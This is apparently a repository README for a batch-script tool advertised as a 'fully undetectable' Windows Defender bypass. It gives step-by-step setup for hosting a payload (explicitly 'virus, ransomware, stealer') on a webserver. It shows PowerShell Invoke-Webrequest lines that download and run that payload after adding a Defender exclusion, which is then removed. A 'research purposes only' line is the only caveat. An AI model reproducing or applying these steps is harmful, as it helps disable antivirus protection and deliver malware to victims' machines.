# Windows-Defender-Bypass
Fully undetectable bypass for Windows Defender. Works by adding an exclusion for exe files, downloading your file and removing the exclusion after running the file.
# This project is intended for research purposes only.
# Setup
If you already have a webserver, skip to step 2.  
  
1, To start setting up the bypass, you will need a webserver, you can create one by heading over to https://replit.com and creating an HTML, CSS & JS repl, after that, you will need to run the repl. It should then open up a website preview and give you the webserver URL above it.  
  
2, Upload the file you wish to execute (virus, ransomware, stealer, etc) to the webserver and rename the file to installer.exe.  
  
3, Edit line 31 in the installer.bat file:  
```bat
Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe" # Change https://YOURSITE.COM/installer.exe to your webserver URL. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.exe
```
4, Upload the installer.bat to your webserver.
5, Edit line 4 in the main.bat file:
```bat
Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat" # Replace https://YOURSITE.COM/installer.bat with your webserver URL and the path to the installer.bat file. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.bat
```
6, Done. The file you would use to bypass windows defender would be main.bat. You can convert it to an executable but this will raise the number of detections. If this helped you, make sure to star this repository (;
